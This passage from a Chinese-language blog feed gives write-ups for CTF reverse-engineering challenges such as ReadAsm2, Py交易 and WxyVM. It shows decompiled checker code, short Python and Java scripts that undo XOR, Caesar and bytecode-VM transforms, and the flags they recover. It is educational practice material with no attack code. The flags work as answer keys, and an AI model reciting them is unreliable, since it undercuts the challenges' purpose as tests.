(Resultlist.equals(KEYList)) {</span><br><span class="line">            System.out.println(<span class="hljs-string">"Congratulations！"</span>);</span><br><span class="line">        } <span class="hljs-keyword">else</span> {</span><br><span class="line">            System.err.println(<span class="hljs-string">"Error！"</span>);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>把KEY每个值都减去64^32就好了，没什么难度，所以试试用Java写，练练手</p><figure class="highlight java hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> com.company;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>{</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">int</span>[] KEY = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]{<span class="hljs-number">180</span>, <span class="hljs-number">136</span>, <span class="hljs-number">137</span>, <span class="hljs-number">147</span>, <span class="hljs-number">191</span>, <span class="hljs-number">137</span>, <span class="hljs-number">147</span>, <span class="hljs-number">191</span>, <span class="hljs-number">148</span>, <span class="hljs-number">136</span>, <span class="hljs-number">133</span>, <span class="hljs-number">191</span>, <span class="hljs-number">134</span>, <span class="hljs-number">140</span>, <span class="hljs-number">129</span>, <span class="hljs-number">135</span>, <span class="hljs-number">191</span>, <span class="hljs-number">65</span>};</span><br><span class="line">        ArrayList&lt;Integer&gt; resultList = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> value : KEY) {</span><br><span class="line">            resultList.add(value - <span class="hljs-number">64</span> ^ <span class="hljs-number">32</span>);</span><br><span class="line">        }</span><br><span class="line"><span class="hljs-comment">//        System.out.println(resultList);</span></span><br><span class="line">        StringBuilder s = <span class="hljs-keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> value:resultList){</span><br><span class="line">            s.append((<span class="hljs-keyword">char</span>)value);</span><br><span class="line">        }</span><br><span class="line">        System.out.println(<span class="hljs-string">"flag{"</span>+s+<span class="hljs-string">"}"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>直接输出flag</p><figure class="highlight ceylon hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{This<span class="hljs-number">_</span><span class="hljs-keyword">is</span><span class="hljs-number">_</span>the<span class="hljs-number">_f</span>lag<span class="hljs-number">_</span>!}</span><br></pre></td></tr></tbody></table></figure><h4 id="findit"><a href="#findit" class="headerlink" title="findit"></a>findit</h4><p>不管是apktool反编译还是直接cfr反编译到代码，都可以找到一串很像flag的字符数组</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">pvkq</span>{m<span class="hljs-number">164675262033</span>l<span class="hljs-number">4</span>m<span class="hljs-number">49</span>lnp<span class="hljs-number">7</span>p<span class="hljs-number">9</span>mnk<span class="hljs-number">28</span>k<span class="hljs-number">75</span>}</span><br></pre></td></tr></tbody></table></figure><p>直接凯撒密码解密，a与k之间相差10，所以key=10</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">flag</span>{c<span class="hljs-number">164675262033</span>b<span class="hljs-number">4</span>c<span class="hljs-number">49</span>bdf<span class="hljs-number">7</span>f<span class="hljs-number">9</span>cda<span class="hljs-number">28</span>a<span class="hljs-number">75</span>}</span><br></pre></td></tr></tbody></table></figure><h4 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h4><p>直接<a href="http://tool.chacuo.net/cryptrsakeyparse">解析公钥</a>，然后暴力分解解密就可以了</p></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CGCTF-re部分题解</title>
      <link href="/2020/01/11/CGCTF-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
      <url>/2020/01/11/CGCTF-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>CG-CTF是南邮的平台，题目都很不错，这里记录一下部分题解决题目的思路和方法</p><span id="more"></span><h4 id="Hello-RE"><a href="#Hello-RE" class="headerlink" title="Hello,RE!"></a>Hello,RE!</h4><p>打开程序，发现输入flag，用OD打开，注意到是将输入的字符串和flag直接进行比较，所以单步调试直接找到flag<br><img src="https://s2.ax1x.com/2020/02/13/1qp7a4.png" alt="Hello,RE!-1"></p><h4 id="ReadAsm2"><a href="#ReadAsm2" class="headerlink" title="ReadAsm2"></a>ReadAsm2</h4><p>这题考的是直接读汇编的能力，代码贴在下面</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> <span class="hljs-keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">char</span> input[] = {<span class="hljs-number">0x0</span>,  <span class="hljs-number">0x67</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6d</span>,</span><br><span class="line">                  <span class="hljs-number">0x55</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x7b</span>,</span><br><span class="line">                  <span class="hljs-number">0x71</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x66</span> , <span class="hljs-number">0x1c</span>};</span><br><span class="line">  <span class="hljs-built_in">func</span>(input, <span class="hljs-number">28</span>);</span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s\n"</span>,input+<span class="hljs-number">1</span>);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">00000000004004e6 &lt;func&gt;:</span><br><span class="line">  4004e6: 55                    push   rbp</span><br><span class="line">  4004e7: 48 89 e5              mov    rbp,rsp</span><br><span class="line">  4004ea: 48 89 7d e8           mov    QWORD PTR [rbp-0x18],rdi</span><br><span class="line">  4004ee: 89 75 e4              mov    DWORD PTR [rbp-0x1c],esi</span><br><span class="line">  4004f1: c7 45 fc 01 00 00 00  mov    DWORD PTR [rbp-0x4],0x1</span><br><span class="line">  4004f8: eb 28                 jmp    400522 &lt;func+0x3c&gt;</span><br><span class="line">  4004fa: 8b 45 fc              mov    eax,DWORD PTR [rbp-0x4]</span><br><span class="line">  4004fd: 48 63 d0              movsxd rdx,eax</span><br><span class="line">  400500: 48 8b 45 e8           mov    rax,QWORD PTR [rbp-0x18]</span><br><span class="line">  400504: 48 01 d0              add    rax,rdx</span><br><span class="line">  400507: 8b 55 fc              mov    edx,DWORD PTR [rbp-0x4]</span><br><span class="line">  40050a: 48 63 ca              movsxd rcx,edx</span><br><span class="line">  40050d: 48 8b 55 e8           mov    rdx,QWORD PTR [rbp-0x18]</span><br><span class="line">  400511: 48 01 ca              add    rdx,rcx</span><br><span class="line">  400514: 0f b6 0a              movzx  ecx,BYTE PTR [rdx]</span><br><span class="line">  400517: 8b 55 fc              mov    edx,DWORD PTR [rbp-0x4]</span><br><span class="line">  40051a: 31 ca                 xor    edx,ecx</span><br><span class="line">  40051c: 88 10                 mov    BYTE PTR [rax],dl</span><br><span class="line">  40051e: 83 45 fc 01           add    DWORD PTR [rbp-0x4],0x1</span><br><span class="line">  400522: 8b 45 fc              mov    eax,DWORD PTR [rbp-0x4]</span><br><span class="line">  400525: 3b 45 e4              cmp    eax,DWORD PTR [rbp-0x1c]</span><br><span class="line">  400528: 7e d0                 jle    4004fa &lt;func+0x14&gt;</span><br><span class="line">  40052a: 90                    nop</span><br><span class="line">  40052b: 5d                    pop    rbp</span><br><span class="line">  40052c: c3                    ret</span><br></pre></td></tr></tbody></table></figure><p>发现这段汇编的作用就是实现input[i]^i，所以实现上面代码输出得到flag</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="hljs-number">0x0</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6d</span>,</span><br><span class="line">     <span class="hljs-number">0x55</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x7b</span>,</span><br><span class="line">     <span class="hljs-number">0x71</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x1c</span>]</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):</span><br><span class="line">    s[i] ^= i</span><br><span class="line"></span><br><span class="line">out = <span class="hljs-string">''</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):</span><br><span class="line">    out += <span class="hljs-built_in">chr</span>(s[i])</span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">print</span>(out)</span><br></pre></td></tr></tbody></table></figure><p>输出flag为：</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{read_asm_is_the_basic}</span><br></pre></td></tr></tbody></table></figure><h4 id="Py交易"><a href="#Py交易" class="headerlink" title="Py交易"></a>Py交易</h4><p>本题是python的反编译，使用在线工具或uncompyle6将pyc文件反编译，得到代码</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode</span>(<span class="hljs-params">message</span>):</span></span><br><span class="line">    s = <span class="hljs-string">''</span></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> message:</span><br><span class="line">        x = <span class="hljs-built_in">ord</span>(i) ^ <span class="hljs-number">32</span></span><br><span class="line">        x = x + <span class="hljs-number">16</span></span><br><span class="line">        s += <span class="hljs-built_in">chr</span>(x)</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> base64.b64encode(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">correct = <span class="hljs-string">'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'</span></span><br><span class="line">flag = <span class="hljs-string">''</span></span><br><span class="line"><span class="hljs-built_in">print</span> <span class="hljs-string">'Input flag:'</span></span><br><span class="line">flag = raw_input()</span><br><span class="line"><span class="hljs-keyword">if</span> encode(flag) == correct:</span><br><span class="line">    <span class="hljs-built_in">print</span> <span class="hljs-string">'correct'</span></span><br><span class="line"><span class="hljs-keyword">else</span>:</span><br><span class="line">    <span class="hljs-built_in">print</span> <span class="hljs-string">'wrong'</span></span><br><span class="line"><span class="hljs-keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode</span>(<span class="hljs-params">message</span>):</span></span><br><span class="line">    s = <span class="hljs-string">''</span></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> message:</span><br><span class="line">        x = <span class="hljs-built_in">ord</span>(i) ^ <span class="hljs-number">32</span></span><br><span class="line">        x = x + <span class="hljs-number">16</span></span><br><span class="line">        s += <span class="hljs-built_in">chr</span>(x)</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> base64.b64encode(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">correct = <span class="hljs-string">'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'</span></span><br><span class="line">flag = <span class="hljs-string">''</span></span><br><span class="line"><span class="hljs-built_in">print</span> <span class="hljs-string">'Input flag:'</span></span><br><span class="line">flag = raw_input()</span><br><span class="line"><span class="hljs-keyword">if</span> encode(flag) == correct:</span><br><span class="line">    <span class="hljs-built_in">print</span> <span class="hljs-string">'correct'</span></span><br><span class="line"><span class="hljs-keyword">else</span>:</span><br><span class="line">    <span class="hljs-built_in">print</span> <span class="hljs-string">'wrong'</span></span><br></pre></td></tr></tbody></table></figure><p>研究代码，发现我们只要将correct逆向解密，就可以得到正确的flag，所以得到如下exp：</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">correct = <span class="hljs-string">'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'</span></span><br><span class="line">correct = <span class="hljs-built_in">str</span>(base64.b64decode(correct))  <span class="hljs-comment"># ^SdVkT#S ]`Y\\!^)\x8f\x80ism</span></span><br><span class="line"><span class="hljs-comment"># print(correct)</span></span><br><span class="line">correct = <span class="hljs-string">'^SdVkT#S ]`Y\\!^)\x8f\x80ism'</span></span><br><span class="line">flag = <span class="hljs-string">''</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> correct:</span><br><span class="line">    x = <span class="hljs-built_in">ord</span>(s)</span><br><span class="line">    x -= <span class="hljs-number">16</span></span><br><span class="line">    i = <span class="hljs-built_in">chr</span>(x ^ <span class="hljs-number">32</span>)</span><br><span class="line">    flag += i</span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p>输出flag为：</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nctf{d3c0mpil1n9_PyC}</span><br></pre></td></tr></tbody></table></figure><h4 id="WxyVM"><a href="#WxyVM" class="headerlink" title="WxyVM"></a>WxyVM</h4><p>下载下来不知道是什么文件，记事本打开，开头ELF，所以直接拖进IDA反编译，main函数如下：</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">char</span> **a2, <span class="hljs-keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">char</span> v4; <span class="hljs-comment">// [rsp+Bh] [rbp-5h]</span></span><br><span class="line">  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"[WxyVM 0.0.1]"</span>);</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"input your flag:"</span>);</span><br><span class="line">  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%s"</span>, &amp;byte_604B80);</span><br><span class="line">  v4 = <span class="hljs-number">1</span>;</span><br><span class="line">  <span class="hljs-built_in">sub_4005B6</span>();</span><br><span class="line">  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(&amp;byte_604B80) != <span class="hljs-number">24</span> )</span><br><span class="line">    v4 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">23</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">if</span> ( *(&amp;byte_604B80 + i) != dword_601060[i] )</span><br><span class="line">      v4 = <span class="hljs-number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v4 )</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"correct"</span>);</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"wrong"</span>);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>一开始认为需要输入一个24位的flag，然后和dword_601060每一位都相等即可，但是中间的sub_4005B6()函数对我们输入的flag还进行了一些变换，所以需要把dword_601060对应的进行反变换才能得到应该输入的正确的flag</p><p>sub_4005B6()函数如下：</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">__int64 <span class="hljs-title">sub_4005B6</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v0; <span class="hljs-comment">// ST04_4</span></span><br><span class="line">  __int64 result; <span class="hljs-comment">// rax</span></span><br><span class="line">  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v3; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">14999</span>; i += <span class="hljs-number">3</span> )</span><br><span class="line">  {</span><br><span class="line">    v0 = byte_6010C0[i];</span><br><span class="line">    v3 = byte_6010C0[i + <span class="hljs-number">2</span>];</span><br><span class="line">    result = v0;</span><br><span class="line">    <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> ( v0 )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">case</span> <span class="hljs-number">1u</span>:</span><br><span class="line">        result = byte_6010C0[i + <span class="hljs-number">1</span>];</span><br><span class="line">        *(&amp;byte_604B80 + result) += v3;</span><br><span class="line">        <span class="hljs-keyword">break</span>;</span><br><span class="line">      <span class="hljs-keyword">case</span> <span class="hljs-number">2u</span>:</span><br><span class="line">        result = byte_6010C0[i + <span class="hljs-number">1</span>];</span><br><span class="line">        *(&amp;byte_604B80 + result) -= v3;</span><br><span class="line">        <span class="hljs-keyword">break</span>;</span><br><span class="line">      <span class="hljs-keyword">case</span> <span class="hljs-number">3u</span>:</span><br><span class="line">        result = byte_6010C0[i + <span class="hljs-number">1</span>];</span><br><span class="line">        *(&amp;byte_604B80 + result) ^= v3;</span><br><span class="line">        <span class="hljs-keyword">break</span>;</span><br><span class="line">      <span class="hljs-keyword">case</span> <span class="hljs-number">4u</span>:</span><br><span class="line">        result = byte_6010C0[i + <span class="hljs-number">1</span>];</span><br><span class="line">        *(&amp;byte_604B80 + result) *= v3;</span><br><span class="line">        <span class="hljs-keyword">break</span>;</span><br><span class="line">      <span class="hljs-keyword">case</span> <span class="hljs-number">5u</span>:</span><br><span class="line">        result = byte_6010C0[i + <span class="hljs-number">1</span>];</span><br><span class="line">        *(&amp;byte_604B80 + result) ^= *(&amp;byte_604B80 + byte_6010C0[i + <span class="hljs-number">2</span>]);</span><br><span class="line">        <span class="hljs-keyword">break</span>;</span><br><span class="line">      <span class="hljs-keyword">default</span>:</span><br><span class="line">        <span class="hljs-keyword">continue</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>用IDA将byte_6010C0导出，用python进行逆向处理</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="hljs-number">0xc4</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x7</span>, <span class="hljs-number">0xdb</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xc4</span>, <span class="hljs-number">0x6</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0xfc</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0xdf</span>, <span class="hljs-number">0x94</span>,<span class="hljs-number">0xd8</span>, <span class="hljs-number">0xb3</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x8</span>]</span><br><span class="line"><span class="hljs-comment"># dword与char比较，只取最后一位一个字节</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'export_results.txt'</span>) <span class="hljs-keyword">as</span> f: <span class="hljs-comment">#文件里是导出的byte_6010C0</span></span><br><span class="line">    t = f.read().split(<span class="hljs-string">' '</span>)</span><br><span class="line"><span class="hljs-comment"># print(len(t))</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5000</span>):</span><br><span class="line">    v0 = <span class="hljs-built_in">int</span>(t[<span class="hljs-number">3</span> * (<span class="hljs-number">4999</span> - i)], <span class="hljs-number">16</span>)</span><br><span class="line">    v3 = <span class="hljs-built_in">int</span>(t[<span class="hljs-number">3</span> * (<span class="hljs-number">4999</span> - i) + <span class="hljs-number">2</span>], <span class="hljs-number">16</span>)</span><br><span class="line">    result = <span class="hljs-built_in">int</span>(t[<span class="hljs-number">3</span> * (<span class="hljs-number">4999</span> - i) + <span class="hljs-number">1</span>], <span class="hljs-number">16</span>)</span><br><span class="line">    <span class="hljs-keyword">if</span> v0 == <span class="hljs-number">1</span>:</span><br><span class="line">        s[result] -= v3</span><br><span class="line">    <span class="hljs-keyword">elif</span> v0 == <span class="hljs-number">2</span>:</span><br><span class="line">        s[result] += v3</span><br><span class="line">    <span class="hljs-keyword">elif</span> v0 == <span class="hljs-number">3</span>:</span><br><span class="line">        s[result] ^= v3</span><br><span class="line">    <span class="hljs-keyword">elif</span> v0 == <span class="hljs-number">4</span>:</span><br><span class="line">        s[result] /= v3</span><br><span class="line">    <span class="hljs-keyword">elif</span> v0 == <span class="hljs-number">5</span>:</span><br><span class="line">        s[result] ^= s[v3]</span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        <span class="hljs-keyword">continue</span></span><br><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">''</span>.join([<span class="hljs-built_in">str</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(i) % <span class="hljs-number">128</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s]))</span><br></pre></td></tr></tbody></table></figure><p>这里有两件事需要注意，第一是dword只需要取最后一个字节，第二是逆运算时要从最后三位向前计算，最后输出flag: </p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nctf{Embr4ce_Vm_j0in_R3}</span><br></pre></td></tr></tbody></table></figure><h4 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h4><p>极其无聊的迷宫题……</p><p>找到地图、起点终点和上下左右分别对应的键就可以了</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 